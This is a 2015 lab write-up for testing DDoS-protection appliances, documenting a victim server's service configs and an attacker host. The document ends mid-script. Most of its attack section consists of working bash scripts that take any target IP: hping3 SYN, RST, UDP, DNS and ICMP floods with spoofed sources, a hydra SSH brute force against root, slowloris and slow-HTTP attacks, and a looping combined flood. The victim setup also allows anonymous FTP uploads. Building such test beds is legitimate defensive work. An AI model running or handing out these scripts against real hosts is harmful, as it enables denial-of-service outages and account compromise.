{{{
Author       : Mohamed Ashraf Ali
Title        : Distributed Denial Of Service: Device Under Test Proof Of Concept (DDOS DUT POC)
Version      : 1.0
Creation date: 25/6/2015
Latest update: 28/6/2015
}}}



<<TableOfContents(4)>>



{{attachment:logo1.jpg}}


= Introduction =

- In this project we needed to deploy a lab environment in order to test DDOS DUTs.

- Standards were needed to be adjusted for all DUTs testing, where all DUTs were to be tested on common grounds.

- A near real life scenarios needed to be tested and calibrated with given DUTs.

== The main requirements ==

''1-'' Deploy a victim system, with almost all well known services configured and deployed.

''2-'' Deploy An Attacker System capable of Utilizing and deploying several Layer-4 & 7 DDOS Attacks.

''3-'' Deploy a Client System, where it well generate and request Legitimate traffic in correspondence with the Victim.

''4-'' Deploy a Calibration System, in order to act as a dependable performance measurement through out all the phases of the POC. 

-----

= The Victim =

{{attachment:victim.png}}

- The Victim is the System which is going to be under Attack by the Attacker (The Swarm) and under protection by the DDOS DUT.

== System Specifications ==

- The Victim Server held the following Specs:

OS: Debian 8.1 (Jessie)

CPU: 4xCore

RAM: 4GB

Swap: 8GB

Disk: 500GB

== Preparing The Server ==

1- First Comes the network configuration, which includes Mang. Iface and the Data Traffic Iface

2- Add Routes in order to respond to the victim Legitimate Traffic, and the Swarm Layer-7 Attacks.

''Network is configured as below:''
{{{
# The loopback network interface
auto lo
iface lo inet loopback

# PRIMARY IFACES
allow-hotplug eth0
iface eth0 inet static
       address 192.168.0.66
       netmask 255.255.255.0
       network 192.168.0.0
       broadcast 192.168.0.255
#      gateway 192.168.0.1
       name-servers 192.168.0.4

allow-hotplug eth1
iface eth1 inet static
       address 10.10.10.2
       netmask 255.255.255.0
       network 10.10.10.0
       broadcast 10.10.10.255
       gateway 10.10.10.1
#      mtu 800

#STATICS
up route add -net 192.168.0.0/16 gw 192.168.0.1 dev eth0
up route add -net 10.172.99.0/24 gw 192.168.0.1 dev eth0

## Client RESPONCE:
up route add -net 30.30.0.0/16 gw 10.10.10.1 dev eth1

## ATTACK RESPONCE:
#up route add -net 100.200.0.0/16 gw 10.10.10.1 dev eth1
}}}

3- Configure Server Hostname & Hosts File

{{{
root@DDoS-Victim:~# cat /etc/hostname 
DDoS-Victim

root@DDoS-Victim:~# cat /etc/hosts
127.0.0.1       localhost.localdomain  localhost
192.168.0.66    DDoS-Victim.noor.net   DDoS-Victim

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
}}}

4- Configure Apt-cacher Link, for packages installation.

{{{
root@DDoS-Victim:~# cat /etc/apt/apt.conf.d/02apt-cacher 
Acquire::http { Proxy "http://192.168.0.114:3142"; };
}}}

== Installing services ==

- Now I started building and configuring the Services that is going to be under stress.

- Of course all services needs to fully configured and Legitimate, so it can generate Legitimate traffic with the Client System.

=== Apache ===

- Apache Web Server is Used for HTTP & HTTPS Traffic

==== Install Apache ====

- To install Apahce and enable its modules:
{{{
apt-get update && apt-get install apache2 -y

a2enmod ssl
a2enmod rewrite
a2enmod ssl
a2enmod proxy
a2enmod proxy_http
a2enmod proxy_ajp
a2enmod rewrite
a2enmod deflate
a2enmod headers
a2enmod proxy_balancer
a2enmod proxy_connect
a2enmod proxy_html
a2enmod rewrite
a2enmod ssl
a2enmod proxy
a2enmod proxy_http
a2enmod proxy_ajp
a2enmod rewrite
a2enmod deflate
a2enmod headers
a2enmod proxy_balancer
a2enmod proxy_connect
a2enmod proxy_html
}}}

==== Configure Apache ====
- Before restarting APACHE Server, Configure the HTTP Directives.

{{{
root@DDoS-Victim:~# cat /etc/apache2/sites-available/000-default.conf 
<VirtualHost *:80>
        ServerAdmin webmaster@localhost

        DocumentRoot /var/www
        <Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/>
                Options Indexes FollowSymLinks MultiViews
                Options +Indexes
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log

        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel warn

        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:443>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/
        SSLEngine On
        SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
        SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
}}}

- Almost 300Migs of content from NYTIMES Website has been imported and included into our Victim System.

{{{
root@DDoS-Victim:/var/www/www.nytimes.com# pwd
/var/www/www.nytimes.com

root@DDoS-Victim:/var/www/www.nytimes.com# ls -lh
total 1000K
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 2006
drwxr-xr-x  8 root root 4.0K Jun  1 09:13 2014
drwxr-xr-x  8 root root 4.0K Jun  1 09:13 2015
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 ads
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 adx
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 aponline
drwxr-xr-x  2 root root 4.0K Jun  1 09:13 column
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 content
drwxr-xr-x  2 root root 4.0K Jun  1 09:13 crosswords
drwxr-xr-x  2 root root 4.0K Jun  1 09:13 events
-rw-r--r--  1 root root  34K Jun  1 09:13 events.html.tmp
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 imagepages
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 images
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 indexes
-rw-r--r--  1 root root 157K Jun  1 09:13 index.html
drwxr-xr-x 13 root root 4.0K Jun  1 09:13 interactive
drwxr-xr-x  4 root root 4.0K Jun  1 09:13 js
-rw-r--r--  1 root root  66K Jun  1 09:13 most-popular-emailed.html.tmp
-rw-r--r--  1 root root  65K Jun  1 09:13 most-popular.html.tmp
-rw-r--r--  1 root root  66K Jun  1 09:13 most-popular-viewed.html.tmp
drwxr-xr-x 32 root root 4.0K Jun  1 09:13 pages
-rw-r--r--  1 root root  52K Jun  1 09:13 recommendations.html.tmp
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 ref
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 reuters
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 roomfordebate
-rw-r--r--  1 root root 170K Jun  1 09:13 roomfordebate.html.tmp
drwxr-xr-x  2 root root 4.0K Jun  1 09:13 section
drwxr-xr-x  4 root root 4.0K Jun  1 09:13 services
drwxr-xr-x  4 root root 4.0K Jun  1 09:13 slideshow
drwxr-xr-x  4 root root 4.0K Jun  1 09:13 subscriptions
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 svc
-rw-r--r--  1 root root  26K Jun  1 09:13 toggleIHTtoNYT.html.tmp
-rw-r--r--  1 root root  26K Jun  1 09:13 toggleNYTtoIHT.html.tmp
drwxr-xr-x  3 root root 4.0K Jun  1 09:13 travel
drwxr-xr-x 13 root root 4.0K Jun  1 09:13 video
-rw-r--r--  1 root root 115K Jun  1 09:13 videoae0c.html.tmp
-rw-r--r--  1 root root  97K Jun  1 09:13 video.html
}}}

- Restart the service or reboot the Server

=== bind9 ===

- Bind is going to be utilized for DNS Service on the Victim system.

==== Install bind9 ====

- to install bind:
{{{
apt-get update && apt-get install bind9
}}}

==== Configure bind9 ====

- Bind Service Configuration Created:

Zone-IPs
{{{
root@DDoS-Victim:/etc/bind# cat db.192 
;
; BIND reverse data file for local loopback interface
;
$TTL    604800
@       IN      SOA     ns.myhome.net. root.myhome.net. (
                              1         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      ns.
100     IN      PTR     core.myhome.net.
101     IN      PTR     gw.myhome.net.
101     IN      PTR     control.myhome.net.
102     IN      PTR     ns.myhome.net.
102     IN      PTR     dns.myhome.net.
103     IN      PTR     media.myhome.net.
104     IN      PTR     lb.myhome.net.
}}}

Zone Inverse
{{{
root@DDoS-Victim:/etc/bind# cat db.myhome.net 
; BIND reverse data file for empty rfc1918 zone
;
; DO NOT EDIT THIS FILE - it is used for multiple zones.
; Instead, copy it, edit named.conf, and use that copy.
;
$TTL    86400
@       IN      SOA     ns.myhome.net. root.myhome.net. (
                              1         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                          86400 )       ; Negative Cache TTL
;
@       IN      NS      ns.myhome.net.
l1-wifi IN      A       192.168.1.1
l3-wifi IN      A       192.168.1.3

core    IN      A       192.168.1.100
gw      IN      A       192.168.1.101
control IN      A       192.168.1.101
ns      IN      A       192.168.1.102
dns     IN      A       192.168.1.102
media   IN      A       192.168.1.103
lb      IN      A       192.168.1.104

l1-asus IN      A       10.10.10.1
l3-asus IN      A       10.10.10.3
}}}

Add-Zone
{{{
root@DDoS-Victim:/etc/bind# cat named.conf.local 
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "myhome.net" {
         type master;
         file "/etc/bind/db.myhome.net";
};



zone "1.168.192.in-addr.arpa" {
        type master;
        notify no;
        file "/etc/bind/db.192";
};
}}}

Configure DNS Options
{{{
root@DDoS-Victim:/etc/bind# cat named.conf.options 
options {
        directory "/var/cache/bind";

        // If there is a firewall between you and nameservers you want
        // to talk to, you may need to fix the firewall to allow multiple
        // ports to talk.  See http://www.kb.cert.org/vuls/id/800113

        // If your ISP provided one or more IP addresses for stable
        // nameservers, you probably want to use them as forwarders.
        // Uncomment the following block, and insert the addresses replacing
        // the all-0's placeholder.

        // forwarders {
        //      0.0.0.0;
        // };

        //========================================================================
        // If BIND logs error messages about the root key being expired,
        // you will need to update your keys.  See https://www.isc.org/bind-keys
        //========================================================================
        dnssec-validation auto;

        auth-nxdomain no;    # conform to RFC1035
        listen-on-v6 { any; };

        allow-query { localhost; 192.168.0.0/24; 10.10.10.0/24; 172.3.1.0/24; 30.30.0.0/16;};
        allow-recursion { localhost; 192.168.0.0/24; 10.10.10.0/24; 172.3.1.0/24; 30.30.0.0/16;};
        forwarders { 217.139.0.38; 217.139.225.250; 8.8.8.8; 4.2.2.2;};

};
}}}

- Restart the service or reboot the Server

=== postfix ===

- Postfix Is Used for the SMTP type of traffic.

==== Install Postfix ====

- To install postfix:

{{{
apt-get update && apt-get install postfix -y
}}}
==== Configure Postfix ====

- The following Configuration was used to obtain an operational Postfix.

{{{
root@DDoS-Victim:/etc/bind# cat /etc/postfix/main.cf 
# See /usr/share/postfix/main.cf.dist for a commented, more complete version


# Debian specific:  Specifying a file name will cause the first
# line of that file to be used as the name.  The Debian default
# is /etc/mailname.
#myorigin = /etc/mailname

smtpd_banner = $myhostname ESMTP $mail_name (Debian/GNU)
biff = no

# appending .domain is the MUA's job.
append_dot_mydomain = no

# Uncomment the next line to generate "delayed mail" warnings
#delay_warning_time = 4h

readme_directory = no

# TLS parameters
smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
smtpd_use_tls=yes
smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache

# See /usr/share/doc/postfix/TLS_README.gz in the postfix-doc package for
# information on enabling SSL in the smtp client.

myhostname = DDoS-Victim.noor.net
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = /etc/mailname
mydestination = victim.com, DDoS-Victim.noor.net, localhost.noor.net, localhost
relayhost = 
mynetworks = 172.3.1.0/24 192.168.0.0/24 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_command = procmail -a "$EXTENSION"
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
virtual_alias_maps = hash:/etc/postfix/virtual
}}}

- Restart the service or reboot the Server

=== vsftpd ===

- vsftpd was going to be used for FTP service & Traffic generation

==== Install vsftpd ====

- To install the service

{{{
 apt-get update && apt-get install vsftpd -y
}}}

==== Configure vsftpd ====

- The following configuration was created:

{{{
root@DDoS-Victim:/etc/bind# cat /etc/vsftpd.conf
listen=YES

anonymous_enable=YES

local_enable=YES

write_enable=YES

local_umask=022

anon_upload_enable=YES

anon_mkdir_write_enable=YES

dirmessage_enable=YES

use_localtime=YES

xferlog_enable=YES

connect_from_port_20=YES

secure_chroot_dir=/var/run/vsftpd/empty

pam_service_name=vsftpd

rsa_cert_file=/etc/ssl/private/vsftpd.pem

chroot_local_user=YES
}}}


- FTP Directory has been created under user "core"

{{{
root@DDoS-Victim:/home/core/ftp-files# pwd
/home/core/ftp-files
}}}

- Two test files created for FTP Transfer test, 1M & 10M.

{{{
root@DDoS-Victim:/home/core/ftp-files# ls -lh
total 11M
-rw-r--r-- 1 root root  9.9M Jun 10 10:12 test10m
-rw-r--r-- 1 root root 1006K Jun 10 10:09 test1m
}}}

- Restart the service or reboot the Server


=== SNMP ===

- SNMP was needed for server monitoring and for another open port opurtunity.

==== Install SNMP ====

- to install the service exe the following

{{{
apt-get update && apt-get install snmp snmpd -y
}}}

==== Configure SNMP ====

- The following Configuration was used for SNMP.

{{{
root@DDoS-Victim:~# cat /etc/snmp/snmpd.conf
#  Listen for connections from the local system only
agentAddress  udp:127.0.0.1:161
#  Listen for connections on eth1 only
agentAddress  udp:192.168.0.66:161

## System location and contact information
syslocation LAB
syscontact THE-SWARM

rocommunity TeSt0FDd0S
}}}


- Restart the service or reboot the Server

=== ntp ===

- to install NTP on the Server apply the following :

{{{
apt-get update && apt-get install ntp ntpdate ntpstat ntp-doc -y
}}}
-----

= The Swarm =

{{attachment:swarm.jpg}}

- The Swarm is the System responsible for Deploying a wide range of DOS Attacks in order to test the DUT and Bleed the Victim.

== System Specifications ==

- The Swarm Server held the following Specs:

OS: Kali 1.1 (Moto)

CPU: 4xCore

RAM: 8GB

Swap: 8GB

Disk: 500GB

== Preparing The Server ==

1- First Comes the network configuration, which includes Mang. Iface and the Data Traffic Iface.

2- Then a twenty different sub interfaces are created in order to source the attacks from.

{{{
root@The-SWARM:~# cat /etc/network/interfaces 
# The loopback network interface
auto lo
iface lo inet loopback

# PRIMARY IFACES
auto eth0
iface eth0 inet static
       address 192.168.0.77
       netmask 255.255.255.0
       network 192.168.0.0
       broadcast 192.168.0.255
       name-servers 192.168.0.4
#      gateway 192.168.0.1

auto eth1
iface eth1 inet static
       address 172.3.1.2
       netmask 255.255.255.252
       network 172.3.1.0
       broadcast 172.3.1.3
       gateway 172.3.1.1

#STATICS
up route add -net 192.168.0.0/16 gw 192.168.0.1 dev eth0 
up route add -net 10.172.99.0/24 gw 192.168.0.1 dev eth0


######################## ATTACK IFACES

auto eth1:1
iface eth1:1 inet static
        address 40.40.1.1
        netmask 255.255.255.0

auto eth1:2
iface eth1:2 inet static
        address 40.40.2.1
        netmask 255.255.255.0

auto eth1:3
iface eth1:3 inet static
        address 40.40.3.1
        netmask 255.255.255.0

auto eth1:4
iface eth1:4 inet static
        address 40.40.4.1
        netmask 255.255.255.0

auto eth1:5
iface eth1:5 inet static
        address 40.40.5.1
        netmask 255.255.255.0

auto eth1:6
iface eth1:6 inet static
        address 40.40.6.1
        netmask 255.255.255.0

auto eth1:7
iface eth1:7 inet static
        address 40.40.7.1
        netmask 255.255.255.0

auto eth1:8
iface eth1:8 inet static
        address 40.40.8.1
        netmask 255.255.255.0

auto eth1:9
iface eth1:9 inet static
        address 40.40.9.1
        netmask 255.255.255.0

auto eth1:10
iface eth1:10 inet static
        address 40.40.10.1
        netmask 255.255.255.0

auto eth1:11
iface eth1:11 inet static
        address 40.40.11.1
        netmask 255.255.255.0

auto eth1:12
iface eth1:12 inet static
        address 40.40.12.1
        netmask 255.255.255.0

auto eth1:13
iface eth1:13 inet static
        address 40.40.13.1
        netmask 255.255.255.0

auto eth1:14
iface eth1:14 inet static
        address 40.40.14.1
        netmask 255.255.255.0

auto eth1:15
iface eth1:15 inet static
        address 40.40.15.1
        netmask 255.255.255.0

auto eth1:16
iface eth1:16 inet static
        address 40.40.16.1
        netmask 255.255.255.0

auto eth1:17
iface eth1:17 inet static
        address 40.40.17.1
        netmask 255.255.255.0

auto eth1:18
iface eth1:18 inet static
        address 40.40.18.1
        netmask 255.255.255.0

auto eth1:19
iface eth1:19 inet static
        address 40.40.19.1
        netmask 255.255.255.0

auto eth1:20
iface eth1:20 inet static
        address 40.40.20.1
        netmask 255.255.255.0
}}}

3- Configure Server Hostname & Hosts File

{{{
root@The-SWARM:~# cat /etc/hostname
The-SWARM

root@The-SWARM:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       The-SWARM.noor.net      The-SWARM
10.10.10.2      www.victim.com
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.10.2    smtp.victim.com victim.com
}}}

4- Configure Apt-cacher Link, for packages installation.

{{{
root@The-SWARM:~# cat /etc/apt/apt.conf.d/02apt-cacher 
Acquire::http { Proxy "http://192.168.0.114:3142"; };
}}}


== Preparing Attack Tools ==

- The following Tools I used for Attacks:

''Layer4''

1- hping

2- hydra

''Layer7''

3- slowloris

4- slowhttptest

=== Layer 4 Attacks ===

- The following are the Layer-4 Attacks that I built and deployed on The-SWARM System.

==== ATTACK-1: SYN flood ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-1
#! /bin/bash

echo "###################### IP SYN FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PACKET SIZE:
read packet
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip -S -d $packet -p $port --flood -I eth1 --rand-source &
 done

}}}

==== ATTACK-2: SYN-ACK flood ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-2
#! /bin/bash

echo "###################### IP SYN-ACK FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PACKET SIZE:
read packet
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip -S -A -d $packet -p $port --flood -I eth1 --rand-source &
 done
}}}

==== ATTACK-3: Random (but identical across packet) payload (20 bytes payload) ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-3
#! /bin/bash

echo "###################### Flood of random (but identical across packet) payload. ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in range(20)]))" > ack_payload$i
hping3 $tarip -A -d 20 -p $port --flood -I eth1 -E ack_payload$i --rand-source &
done
}}}

==== ATTACK-4: RST flood ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-4
#! /bin/bash

echo "###################### spoofed RST flood ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PACKET SIZE:
read packet
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip -R -d $packet -p $port --flood -I eth1 --rand-source &
 done
}}}

==== ATTACK-5: Synonymous payload (20 bytes payload) with spoofed source of victim itself ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-5
#! /bin/bash

echo "###################### Synonymous payload (20 bytes payload) with spoofed source of victim itself ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #####################################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
 do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in range(20)]))" > synonymous_payload$i
hping3 $tarip -A -d 20 -p $port --flood -I eth2.101 -E synonymous_payload$i --spoof 10.10.10.2 &
 done
}}}

==== ATTACK-6: SSH Brute Force ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-6
#! /bin/bash

echo "###################### SSH BRUTE FORCE ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en "ENTER NUMBER OF SSH THREADS (1-64)[recommend 64]:"
read count
echo "################# STARTING THREADS ##########################"
#packet=$1
#port=$2
#count=$3
cd /usr/bin
hydra $tarip ssh -s 22 -P password-list.txt -l root -e ns -t $count -vV
}}}

==== ATTACK-7: Random (but identical across packet) UDP payload (20 bytes payload) ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-7
#! /bin/bash

echo "###################### Flood of random (but identical across packet) payload. ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in range(20)]))" > udp_payload$i
hping3 $tarip --udp -p $port --flood -I eth1 --rand-source -d 20 -E udp_payload$i &
done
}}}

==== ATTACK-8: Fragmentation Random Payload - UDP PAYLOAD ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-8
#! /bin/bash

echo "###################### Fragmentation Random Payload - UDP PAYLOAD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER Packet Size:
read packet
echo -en ENTER Frag Size:
read frag
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in xrange(1000)]))" > udp_frag_payload$i
hping3 $tarip --udp -p $port --flood -I eth1 --rand-source -x -g $frag -d $packet -E udp_frag_payload$i &
done
}}}

==== ATTACK-9: DNS Payload to DNS port flood ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-9
#! /bin/bash

echo "###################### DNS Payload to DNS port flood ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import sys;
sys.stdout.write('\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01')" > dns_payload$i
hping3 $tarip --udp -p 53 --flood -I eth1 --rand-source -E dns_payload$i -d 28 &
done
}}}

==== ATTACK-10: ICMP code-5 FLOOD ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-10
#! /bin/bash

echo "###################### ICMP code-5 FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip --icmp --flood -I eth1 --rand-source -C 5 &
 done
}}}

==== ATTACK-11: ICMP code-5 FRAG FLOOD ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-11
#! /bin/bash

echo "###################### ICMP code-5 FRAG FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip --icmp --flood -I eth1 --rand-source -c 5 -x -g 100 &
 done
}}}


==== ATTACK-12: ICMP code-8 FLOOD ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-12
#! /bin/bash

echo "###################### ICMP code-8 FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip --icmp --flood -I eth1 --rand-source &
 done
}}}

=== Layer 7 Attacks ===

==== ATTACK-13: SLOW-LORIS HTTP ATTACK ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-13
#! /bin/bash

echo "###################### SLOW-LORIS ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo "CHOOSE ATTACK TYPE:"
echo "1- Test Mode"
echo "2- Default Mode"
echo
read -p 'Your choice: ' Fpointer
echo "################# STARTING THREADS ######################"
cd /usr/bin

case $Fpointer in

  1) ( slowloris.pl -dns $tarip -test
     )
  ;;

  2) ( slowloris.pl -dns $tarip
     )
  ;;

esac
}}}

==== ATTACK-14: SLOW-POST HTTP ATTACK ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-14
#! /bin/bash

echo "###################### SLOW-POST ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo "################# STARTING THREADS ######################"

slowhttptest -c 3000 -B -i 110 -r 200 -s 8192 -t FAKEVERB -u http://$tarip/ -x 10 -p 3
}}}

==== ATTACK-15: SLOW-READ HTTP ATTACK ====

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-15
#! /bin/bash

echo "###################### SLOW-READ ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo "################# STARTING THREADS ######################"

slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$tarip/ -p 3
}}}

=== Custom Attacks ===

==== CHRISTMAS ATTACK ====

- A combination of layer-4 DDOS Attacks with variations in type of attacks and in packet sizes.

- This attack uses all available ports for generating attacks.

{{{
root@The-SWARM:~# cat /usr/bin/ATTACK-20
#! /bin/bash

echo
echo "###################### CHRISTMAS ATTACK: FLOOD COCKTAIL WITH SMART CHANGE ######################"
echo
echo -en "Whos REALLY Gona Bleed Today (IP):"
read tarip
echo
echo -en "Enter Smart Change Duration Period in Seconds:"
read speriod
echo
echo -en "HIT ENTER TO MAKE IT BLEED !!"
read thisisit
echo "################################### STARTING THREADS ##########################################"


while true
do
      ztep=$(echo $RANDOM | cut -c1-2)
      for i in $(seq 64 $ztep 1500)
      do
          packet=$i
          ## SYN TYPE
          hping3 $tarip -S -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -S -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## SYN-ACK TYPE
          hping3 $tarip -S -A -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -S -A -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## RST FLAG TYPE
          hping3 $tarip -R -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -R -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## FIN FLAG TYPE
          hping3 $tarip -F -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 53 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 80 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 111 --flood -I eth1 --rand-source &
          hping3 $tarip -F -d $packet -p 161 --flood -I eth1 --rand-source &
sleep $speriod
          pkill hping3
          ## PUSH FLAG TYPE
          hping3 $tarip -P -d $packet -p 21 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 22 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 25 --flood -I eth1 --rand-source &
          hping3 $tarip -P -d $packet -p 53 --flood -I eth1 --rand-source &
